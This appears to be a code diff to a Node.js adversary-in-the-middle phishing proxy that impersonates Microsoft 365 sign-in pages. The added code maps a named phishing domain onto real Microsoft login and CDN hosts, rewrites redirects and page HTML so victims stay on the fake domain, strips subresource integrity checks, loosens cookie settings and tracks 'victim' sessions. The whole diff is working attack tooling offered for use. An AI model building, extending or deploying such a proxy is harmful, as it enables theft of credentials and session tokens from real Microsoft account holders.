@@ -35,6 +35,35 @@ const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
 
+// ---- Bidirectional domain mapping (Carlos technique) ----
+const PHISHING_DOMAIN = 'triumphant-adventure-production-2ae7.up.railway.app'; // <-- YOUR DOMAIN
+
+// Incoming: victim requests our phishing domain -> map to real Microsoft domains
+const SUBDOMAIN_MAPPING = {
+    [PHISHING_DOMAIN]: 'login.microsoftonline.com',
+    [`login.${PHISHING_DOMAIN}`]: 'login.microsoft.com',
+    [`office.${PHISHING_DOMAIN}`]: 'www.office.com',
+    [`cdn.${PHISHING_DOMAIN}`]: 'aadcdn.msftauth.net',
+    [`static.${PHISHING_DOMAIN}`]: 'aadcdn.msauth.net',
+    [`live.${PHISHING_DOMAIN}`]: 'login.live.com',
+    // Add m365.cloud.microsoft to the mapping!
+    [`m365.${PHISHING_DOMAIN}`]: 'm365.cloud.microsoft'
+};
+
+// Outgoing (Response): real Microsoft domains -> map back to our phishing domain
+const REVERSE_MAPPING = {};
+for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
+    REVERSE_MAPPING[real] = phish;
+}
+
+// Also add any additional domains Microsoft might send that aren't in SUBDOMAIN_MAPPING
+const EXTRA_REVERSE = {
+    'm365.cloud.microsoft': `m365.${PHISHING_DOMAIN}`,
+    'www.office.com': `office.${PHISHING_DOMAIN}`,
+    'office.com': `office.${PHISHING_DOMAIN}`
+};
+Object.assign(REVERSE_MAPPING, EXTRA_REVERSE);
+
 const PROXY_FILES = {
     index: "index_smQGUDpTF7PN.html",
     notFound: "404_not_found_lk48ZVr32WvU.html",
@@ -99,14 +128,15 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     // ---- Parse URL to handle parameters in any order ----
 // ---- ENTRY: /login with redirect_urI parameter ----
-if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+// ---- ENTRY: any /login with redirect_urI parameter ----
+if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
@@ -124,6 +154,41 @@ if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
             fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
         }
 }
+
+    else if (!currentSession && 
+         url !== PROXY_ENTRY_POINT && 
+         url !== PROXY_PATHNAMES.serviceWorker && 
+         url !== PROXY_PATHNAMES.favicon && 
+         url !== PROXY_PATHNAMES.script && 
+         url !== PROXY_PATHNAMES.jsCookie && 
+         url !== PROXY_PATHNAMES.mutation) {
+    // No session and not a known path – try to extract target from current URL
+    let target = '';
+    try {
+        const query = url.split('?')[1] || '';
+        const params = new URLSearchParams(query);
+        target = params.get(PHISHED_URL_PARAMETER) || '';
+    } catch (e) {}
+    if (!target) {
+        try {
+            const referer = headers.referer || '';
+            if (referer) {
+                const refUrl = new URL(referer);
+                target = refUrl.searchParams.get(PHISHED_URL_PARAMETER) || '';
+            }
+        } catch (e) {}
+    }
+    if (target) {
+        const entryWithTarget = `${PROXY_ENTRY_POINT}&${PHISHED_URL_PARAMETER}=${encodeURIComponent(target)}`;
+        clientResponse.writeHead(302, { Location: entryWithTarget });
+        clientResponse.end();
+        return;
+    } else {
+        clientResponse.writeHead(302, { Location: REDIRECT_URL });
+        clientResponse.end();
+        return;
+    }
+    }
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
@@ -404,13 +469,17 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
             VICTIM_SESSIONS[currentSession].host = locationURL.host;
 
             // Rewrite Location to point back to your proxy domain
-            let rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
-            // Rewrite redirect_uri parameter if present
-            rewritten = rewritten.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
-                              `redirect_uri=https%3A%2F%2F${proxyHostname}`);
-            rewritten = rewritten.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
-                              `redirect_uri=https://${proxyHostname}`);
-            
+            let rewritten = proxyResponseLocation;
+// Replace all known real domains with our phishing domain/subdomains
+for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
+    rewritten = rewritten.replaceAll(real, phish);
+}
+// Also rewrite redirect_uri (just in case)
+rewritten = rewritten.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
+                              `redirect_uri=https%3A%2F%2F${PHISHING_DOMAIN}`);
+rewritten = rewritten.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
+                              `redirect_uri=https://${PHISHING_DOMAIN}`);
+
             proxyResponse.headers.location = rewritten;
             console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
         } catch (error) {
@@ -450,10 +519,18 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
 
         // ---- SRI (Integrity) Removal ----
         let html = decompressedResponseBody.toString('utf8');
-        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
-        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
-        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
-        const cleanedBuffer = Buffer.from(html);
+
+// ---- SRI removal ----
+html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
+html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
+html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
+
+// ---- NEW: Replace all Microsoft domains in the HTML ----
+for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
+    html = html.replaceAll(real, phish);
+}
+
+const cleanedBuffer = Buffer.from(html);
 
         // ---- STATIC injection (original method) ----
         serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
